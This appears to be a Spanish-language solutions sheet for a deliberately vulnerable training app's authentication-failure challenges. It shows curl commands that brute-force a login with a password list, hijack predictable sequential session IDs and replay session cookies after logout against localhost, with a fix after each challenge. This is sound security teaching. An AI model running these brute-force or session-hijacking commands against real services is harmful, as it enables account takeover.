# A07 – Fallos de Autenticación: Soluciones

## Reto 1 – Fuerza Bruta
No existe límite de intentos ni bloqueo de cuenta. Ejecuta este script en la terminal:
```bash
for pw in password 123456 sunshine admin123 qwerty iloveyou; do
  result=$(curl -s -X POST http://localhost:5000/a07/login \
    -d "username=alice&password=$pw" | grep -o 'ÉXITO\|fail')
  echo "alice / $pw → $result"
done
```
La contraseña de `alice` es `sunshine`.

**Corrección:** Implementa bloqueo de cuenta (ej. 5 intentos → bloqueo de 15 min) o retroceso exponencial.
Usa `flask-limiter` para limitar la tasa de peticiones.

## Reto 2 – Predicción de Sesión
Inicia sesión varias veces y observa que `session_id` es un entero secuencial (1, 2, 3...).
Configura la cookie manualmente:
```bash
curl -b "session_id=1" http://localhost:5000/a07/profile
```
Esto retorna el perfil de quien tenga la sesión #1 — aunque hayas iniciado sesión como otra persona.

**Corrección:** Usa `secrets.token_hex(32)` para los tokens de sesión. Nunca uses IDs secuenciales.

## Reto 3 – Contraseña en Cookie
Inicia sesión con "Recordarme" activado. Inspecciona la cookie en DevTools → Application → Cookies:
```
remember_me=alice:sunshine
```
Credenciales en texto plano almacenadas en el navegador. Cualquiera con acceso a la cookie tiene la contraseña.

**Corrección:** Almacena un token aleatorio en el servidor mapeado al usuario. Nunca guardes credenciales en cookies.

## Reto 4 – Cierre de Sesión Sin Invalidación
1. Inicia sesión → anota el valor del cookie `session_id=N`
2. Cierra sesión (el cookie se elimina del navegador)
3. Reenvía la petición desde la terminal:
```bash
curl -b "session_id=N" http://localhost:5000/a07/profile
```
¡Sigues autenticado! El diccionario `_sessions` nunca se limpió al cerrar sesión.

**Corrección:**
```python
@a07.route('/logout')
def logout():
    sid = request.cookies.get('session_id')
    if sid and sid.isdigit():
        _sessions.pop(int(sid), None)  # invalidar en el servidor
    resp = make_response(redirect(url_for('a07.index')))
    resp.delete_cookie('session_id')
    return resp
```
